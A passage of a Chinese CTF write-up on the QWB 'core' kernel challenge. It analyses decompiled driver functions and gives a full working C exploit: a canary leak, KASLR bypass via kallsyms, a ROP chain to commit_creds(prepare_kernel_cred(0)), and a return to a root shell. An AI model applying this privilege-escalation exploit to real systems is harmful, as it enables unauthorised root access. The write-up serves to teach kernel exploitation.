<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  {</span><br><span class="line">    *v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm { swapgs }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以明显的看到将<code>v5[off]</code>拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p>
<p>0x6677889C就是给off设置值</p>
<h3 id="copy-func"><a href="#copy-func" class="headerlink" title="copy_func"></a>copy_func</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  {</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>将全局变量name拷贝数据到局部变量中，长度是我们指定的，这里的a1值得注意一下，参数是<code>__int64</code>，而这里的长度类型是<code>unsigned __int16</code>那这里就存在一个栈溢出。如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p>
<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>接下来还有一个write函数和release函数，release这个函数就是一个printk。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">{</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>向name上写数据，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p>
<h2 id="漏洞利用思路-1"><a href="#漏洞利用思路-1" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>经过如上的分析，可以得出以下的思路：</p>
<ol>
<li>通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</li>
<li>通过 core_write() 向 name 写，构造 ropchain</li>
<li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li>
<li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，通过 system(“/bin/sh”) 等起 shell</li>
</ol>
<h3 id="save-status"><a href="#save-status" class="headerlink" title="save status"></a>save status</h3><p>进入内核态之前会做一些事情，swapgs、交换栈顶、push保存各种寄存器</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>如何返回用户态？<ul>
<li><code>swapgs; iretq</code>，之前说过需要设置 <code>cs, rflags</code> 等信息，可以写一个函数保存这些信息</li>
</ul>
</li>
</ul>
<p>所以我们需要先将状态进行保存，这里用的是intel的语法</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//intel </span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>{</span><br><span class="line">	__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">		<span class="string">"mov user_ss, ss;"</span></span><br><span class="line">		<span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">		<span class="string">"pushf;"</span></span><br><span class="line">		<span class="string">"pop user_rflags;"</span></span><br><span class="line">	       );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>进kernel时还保存了eip，我们可以将eip给指向我们需要的地址就可以了。</p>
<h3 id="rop-链"><a href="#rop-链" class="headerlink" title="rop 链"></a>rop 链</h3><p>构造rop链的话无非就是</p>
<ol>
<li>控制程序流执行<strong>commit_creds(prepare_kernel_cred(0))</strong></li>
<li>执行<strong>swapgs；iretq</strong>，回到用户态。</li>
</ol>
<h3 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h3><p>那么如何获取commit_creds、prapare_kernel_cred函数地址？</p>
<p>启动脚本里把kallsyms另给了/tmp/，所以我们可以使用以下方法来获取<code>commit_creds</code> &amp; <code>prapare_kernel_cred</code>函数地址</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">cat</span> /tmp/kallsyms | grep commit_creds</span><br><span class="line">ffffffffae49c8e0 T commit_creds</span><br><span class="line">/ $ <span class="built_in">cat</span> /tmp/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffffae49cce0 T prepare_kernel_cred</span><br></pre></td></tr></tbody></table></figure>

<p>接着找出两个函数在vmlinux中的偏移。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./file_system/vmlinux'</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"commit_creds = "</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">'commit_creds'</span>]-<span class="number">0xffffffff81000000</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"prepare_kernel_cred = "</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">'prepare_kernel_cred'</span>]-<span class="number">0xffffffff81000000</span>))</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/11.png"></p>
<p>可以看到偏移已经出来了，vmlinux_base = 0xffffffffae49c8e0 - 0x9c8e0 = 0xffffffffae400000，因为这个题目有kalsr，所以我们这里只不过看一下如何获取vmlinux_base，在实际环境中，我们得要写exp来自动获取。</p>
<h3 id="获取gadget"><a href="#获取gadget" class="headerlink" title="获取gadget"></a>获取gadget</h3><p>这个使用ropper吧，快～</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player ropper --file ./vmlinux &gt; gadget      </span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br></pre></td></tr></tbody></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">//intel 保存用户态</span><br><span class="line">void save_status(){</span><br><span class="line">        __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">                <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">                <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">                <span class="string">"pushf;"</span></span><br><span class="line">                <span class="string">"pop user_rflags;"</span></span><br><span class="line">               );</span><br><span class="line">        puts(<span class="string">"[*] saved !"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//leak canary</span><br><span class="line">void core_read(<span class="built_in">int</span> fd, char *user_buf){</span><br><span class="line">        ioctl(fd, <span class="number">0x6677889B</span>, user_buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//<span class="built_in">set</span> off</span><br><span class="line">void set_off(<span class="built_in">int</span> fd, long long <span class="built_in">len</span>){</span><br><span class="line">        ioctl(fd, <span class="number">0x6677889C</span>, <span class="built_in">len</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//stack overflow</span><br><span class="line">void core_copy_func(<span class="built_in">int</span> fd, long long <span class="built_in">len</span>){</span><br><span class="line">        ioctl(fd, <span class="number">0x6677889A</span>, <span class="built_in">len</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//起一个root shell</span><br><span class="line">void get_root_shell(){</span><br><span class="line">        <span class="keyword">if</span>(!getuid()){</span><br><span class="line">                puts(<span class="string">"[+] root! pwned by z1r0"</span>);</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">                puts(<span class="string">"[-] false "</span>);</span><br><span class="line">        }</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">size_t commit_creds = <span class="number">0</span>;</span><br><span class="line">size_t prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line">size_t vmlinux_base = <span class="number">0</span>;        //加载后的vmlinux基址</span><br><span class="line">size_t raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;   //未加载时的vmlinux基址</span><br><span class="line"></span><br><span class="line">size_t get_vmlinux_base(){</span><br><span class="line">        FILE* fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        char buf[<span class="number">0x30</span>] = {<span class="number">0</span>};</span><br><span class="line">        <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, fd)){</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(strstr(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds){</span><br><span class="line">                        char <span class="built_in">hex</span>[<span class="number">20</span>] = {<span class="number">0</span>};</span><br><span class="line">                        strncpy(<span class="built_in">hex</span>, buf, <span class="number">16</span>);//只拷贝前<span class="number">16</span>字节</span><br><span class="line">                        sscanf(<span class="built_in">hex</span>,<span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">                        printf(<span class="string">"[+] commit_creds = %p\n"</span>, commit_creds);</span><br><span class="line">                        vmlinux_base = commit_creds-<span class="number">0x9c8e0</span>;</span><br><span class="line">                        printf(<span class="string">"[+] vmlinux_base = %p\n"</span>, vmlinux_base);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(strstr(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred){</span><br><span class="line">                        char <span class="built_in">hex</span>[<span class="number">20</span>] = {<span class="number">0</span>};</span><br><span class="line">                        strncpy(<span class="built_in">hex</span>, buf, <span class="number">16</span>);</span><br><span class="line">                        sscanf(<span class="built_in">hex</span>, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">                        printf(<span class="string">"[+] prepare_kernel_cred = %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">                        vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">                        printf(<span class="string">"[+] vmlinux_base = %p\n"</span>, vmlinux_base);</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(! (prepare_kernel_cred &amp; commit_creds)){</span><br><span class="line">                puts(<span class="string">"error !"</span>);</span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char **argv){</span><br><span class="line">        save_status();</span><br><span class="line">        puts(<span class="string">"[+] start kernel pwn !"</span>);</span><br><span class="line">        <span class="built_in">int</span> fd = <span class="built_in">open</span>(<span class="string">"/proc/core"</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        //获取函数地址和vmlinux基址</span><br><span class="line">        get_vmlinux_base();</span><br><span class="line"></span><br><span class="line">        //计算偏移</span><br><span class="line">        ssize_t offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">        //设置off值，ida可以看到canary偏移为<span class="number">0x40</span></span><br><span class="line">        set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">        //leak canary</span><br><span class="line">        char buf[<span class="number">0x40</span>] = {<span class="number">0</span>};</span><br><span class="line">        core_read(fd, buf);</span><br><span class="line"></span><br><span class="line">        size_t  canary = ((size_t * )buf)[<span class="number">0</span>];</span><br><span class="line">        printf(<span class="string">"[+] canary = %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">        //构造rop</span><br><span class="line">        size_t rop[<span class="number">0x1000</span>] = {<span class="number">0</span>};</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i){</span><br><span class="line">                rop[i++] = canary;</span><br><span class="line">        }</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; //pop rdi ; ret</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; //pop rdx; ret</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; // pop rcx; ret</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; // mov rdi, rax; call rdx; </span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; // swapgs; popfq; ret</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; // iretq; ret; </span><br><span class="line">        rop[i++] = (size_t)get_root_shell;</span><br><span class="line">        rop[i++] = user_cs;</span><br><span class="line">        rop[i++] = user_rflags;</span><br><span class="line">        rop[i++] = user_sp;</span><br><span class="line">        rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">        write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">        core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>exp写完之后，编译，打包，然后运行start.sh</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player gcc exp.c -static -masm=intel -g -o exp</span><br><span class="line">➜  give_to_player <span class="built_in">cp</span> exp file_system </span><br><span class="line">➜  give_to_player <span class="built_in">cd</span> file_system </span><br><span class="line">➜  file_system ./gen_cpio.sh core.cpio</span><br><span class="line">➜  file_system <span class="built_in">cp</span> core.cpio ../</span><br><span class="line">➜  file_system <span class="built_in">cd</span> ..</span><br><span class="line">➜  give_to_player ./start.sh </span><br></pre></td></tr></tbody></table></figure>

<p>可以看到成功运行exp。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/12.png"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel-UAF"><span class="toc-number">1.</span> <span class="toc-text">Kernel UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-amp-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析 &amp; 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-amp-exit"><span class="toc-number">1.2.1.</span> <span class="toc-text">init &amp; exit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-amp-release"><span class="toc-number">1.2.2.</span> <span class="toc-text">open &amp; release</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-amp-read"><span class="toc-number">1.2.3.</span> <span class="toc-text">write &amp; read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl"><span class="toc-number">1.2.4.</span> <span class="toc-text">ioctl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">2.</span> <span class="toc-text">Kernel ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87-1"><span class="toc-number">2.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-amp-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">逆向分析 &amp; 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-amp-exit-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">init &amp; exit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read"><span class="toc-number">2.2.3.</span> <span class="toc-text">read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#copy-func"><span class="toc-number">2.2.4.</span> <span class="toc-text">copy_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write"><span class="toc-number">2.2.5.</span> <span class="toc-text">write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#save-status"><span class="toc-number">2.3.1.</span> <span class="toc-text">save status</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop-%E9%93%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">rop 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.3.</span> <span class="toc-text">获取函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96gadget"><span class="toc-number">2.3.4.</span> <span class="toc-text">获取gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;text=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
